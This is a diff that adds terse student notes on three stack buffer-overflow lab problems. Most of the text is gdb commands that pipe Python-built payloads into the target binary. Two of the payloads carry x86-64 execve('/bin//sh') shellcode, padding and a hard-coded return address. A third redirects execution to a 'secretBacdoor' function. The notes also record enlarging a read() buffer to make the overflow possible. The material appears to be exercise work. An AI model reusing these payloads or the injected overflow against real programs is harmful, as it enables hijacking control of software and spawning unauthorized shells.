@@ -1,0 +1,30 @@
+#
+#Problem 1
+#
+change read(0, &bug, 30) -> read(0, &bug, 100)
+took 40 bytes to create segmant fault
+
+exploit in gdb
+r < <(python -c "print(b'\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05' + b'A'*16 + b'\xe0\xde\xFF\xFF\xFF\x7F\x00\x00')";cat)
+
+
+#
+#Problem 2
+#
+Very strange when running 73 you get illegal instruction core dump. 74 gets segmant fualt. 72 gets infinite loop. However running in gdb you can see that 72 fills rbp without any bytes on stack and no seg fault. 73 writes to return but no seg fault either. 74 gives seg fault.
+
+return the address to secretBacdoor+5 to the mov rbp,rsp instruction. Every other address sucks
+r $(python -c "print (b'A'*72 + b'\xae\x51\x55\x55\x55\x55\x00\x00')")
+
+
+#
+#Problem 3
+#
+It wasn't working for some reason. Quit out of gdb then just run it without any breakpoints and you got shell
+r $(python -c "print(b'\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05' + b'A'*48 + b'\x80\xde\xff\xff\xff\x7f\x00')")
+
+
+#
+#
+#
+
